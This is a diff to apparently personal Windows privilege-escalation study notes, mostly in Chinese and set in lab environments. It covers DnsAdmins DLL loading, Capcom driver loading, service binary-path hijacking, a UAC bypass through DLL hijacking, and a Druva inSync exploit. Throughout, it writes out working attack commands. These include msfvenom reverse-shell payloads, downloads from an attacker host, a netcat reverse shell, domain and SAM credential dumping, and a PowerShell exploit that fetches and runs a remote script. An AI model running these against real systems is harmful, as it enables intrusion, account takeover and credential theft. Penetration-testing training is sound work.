@@ -1,3 +1,10 @@
+Windows会根据文件的扩展名来决定执行方式，在服务启动时按顺序尝试潜在的可执行文件，默认扩展名为exe：
+C:\Program
+C:\Program Files
+C:\Program Files (x86)\System
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64
+
+
 Tools:
   https://github.com/GhostPack/Seatbelt            bin:      https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
   https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
@@ -124,8 +131,163 @@ ___
   PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
   PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 
+
   secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 
   robocopy /B E:\Windows\NTDS .\ntds ntds.dit           复制ntds 
     https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
 
+***
+Event log:
+  PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"
+  C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+    https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
+
+  PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
+  | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+
+***
+DnsAdmins:            新增高级用户
+  msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll      新增netadm用户      也可以做反向shell的dll
+  python3 -m http.server 7777
+  ssh OR rdp to target
+  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
+  Get-ADGroupMember -Identity DnsAdmins            以 DnsAdmins 组成员身份加载 DLL
+  dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+  wmic useraccount where name="netadm" get sid
+  sc.exe sdshow DNS            sc.exe（全称 Service Control Manager Configuration Tool，即服务控制管理器配置工具）
+  sc stop dns
+  sc start dns
+  net group "Domain Admins" /dom            /dom 或 /domain：告诉系统不要在本地查找，而是通过 RPC 向当前机器所加入的域控制器（DC）发起请求，查询域级别的组信息
+  清理:
+    reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+
+  https://github.com/gentilkiwi/mimikatz/tree/master/mimilib        反向shell的dll工具
+
+  C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+  C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+    默认情况下，Web 代理自动发现协议 (Web Proxy Automatic Discovery Protocol, WPAD) 和站内自动隧道寻址协议 (Intra-site Automatic Tunnel Addressing Protocol, ISATAP) 都在全局查询阻止列表中。
+    这些协议非常容易受到劫持，并且任何域用户都可以创建包含这些名称的计算机对象或 DNS 记录。
+    在禁用全局查询阻止列表并创建 WPAD 记录后，每台使用默认设置运行 WPAD 的机器的流量都将通过我们的攻击机进行代理。
+    我们可以使用像 Responder 或 Inveigh 这样的工具来执行流量欺骗，并尝试捕获密码哈希进行离线破解，或执行 SMB 中继攻击 (SMBRelay attack)。
+
+***
+SeLoadDriverPrivilege
+
+  https://github.com/hfiref0x/UACME
+
+  https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
+  将其下载到本地并进行编辑，用下面的 include 语句覆盖原有的:
+  #include <windows.h>
+  #include <assert.h>
+  #include <winternl.h>
+  #include <sddl.h>
+  #include <stdio.h>
+  #include "tchar.h"
+
+  cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+  download driver:      https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
+  reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+  reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+  EnableSeLoadDriverPrivilege.exe
+  PS C:\htb> .\ExploitCapcom.exe            https://github.com/tandasat/ExploitCapcom
+    TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");            如果没有GUI
+
+  EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+    https://github.com/TarlogicSecurity/EoPLoadDriver/      自动化以上
+
+***
+SeBackupPrivilege 和 SeRestorePrivilege
+  C:\htb> c:\Tools\PsService.exe security AppReadiness      它工作方式与 sc 实用程序非常相似，可以显示服务状态和配置，还允许您在本地和远程主机上启动、停止、暂停、恢复和重启服务
+    https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
+
+  C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+  C:\htb> sc start AppReadiness
+
+  crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+  secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+
+***
+用户帐户控制 (User Account Control, UAC) 是一项功能，它能为提升权限的活动启用一个同意提示
+通过 DLL 劫持 (DLL hijacking) 来绕过 UAC，方法是将一个恶意的 srrstr.dll DLL 放置到 WindowsApps 文件夹中
+  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+  sudo python3 -m http.server 8080
+  PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+      OR      certutil.exe -f -urlcache http://10.10.14.80:8080/srrstr.dll srrstr.dll
+  nc -lvnp 8443
+  C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+  C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+
+***
+week ACL
+  PS C:\htb> .\SharpUp.exe audit
+    https://github.com/GhostPack/SharpUp/
+
+  icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"  (PATH NAME FROM SHARPUP)
+    https://ss64.com/nt/icacls.html            Files and Folders pri
+
+  C:\htb> accesschk.exe /accepteula -quvcw WindscribeService  (PATH NAME FROM SHARPUP)
+    https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk            Service pri
+  C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"            增加高权限用户
+  C:\htb> sc stop WindscribeService
+  C:\htb> sc start WindscribeService
+  清理:
+  C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
+  C:\htb> sc start WindscribeService
+
+  识别未加引号的服务二进制文件路径。
+    C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+  C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services            注册表中检查弱服务 ACL, 接着利用
+  C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+
+  C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl            查找开机自启
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f exe > SecurityService.exe     传送到目标
+  cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"          替换原自启
+  nc -lvnp PWNPO
+  sc start SecurityService
+
+***
+Kernal
+  https://msrc.microsoft.com/update-guide/vulnerability            Windows漏洞库
+
+  C:\htb> icacls c:\Windows\System32\config\SAM            查看SAM权限
+
+  .\HiveNightmare.exe            制作hive副本            https://github.com/GossiTheDog/HiveNightmare
+  impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
+
+  C:\htb> wmic qfe list brief            查看已安装的更新
+  在 Microsoft 更新目录 中搜索每个 KB            https://www.catalog.update.microsoft.com/Search.aspx?q=KB
+
+***
+弱应用
+  C:\htb> wmic product get name            查应用
+  C:\htb> netstat -ano | findstr 6064      查端口
+  PS C:\htb> get-process -Id 3324          查PID
+  PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}      再确认以上3步，确认应用在运行
+
+  $ErrorActionPreference = "Stop"
+
+——————
+$cmd = "net user pwnd /add"
+
+  $s = New-Object System.Net.Sockets.Socket(
+      [System.Net.Sockets.AddressFamily]::InterNetwork,
+      [System.Net.Sockets.SocketType]::Stream,
+      [System.Net.Sockets.ProtocolType]::Tcp
+  )
+  $s.Connect("127.0.0.1", 6064)
+  
+  $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+  $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+  $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");   
+            修改   $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"      修改
+  $length = [System.BitConverter]::GetBytes($command.Length);
+  
+  $s.Send($header)
+  $s.Send($rpcType)
+  $s.Send($length)
+  $s.Send($command)
+——————
+
+  
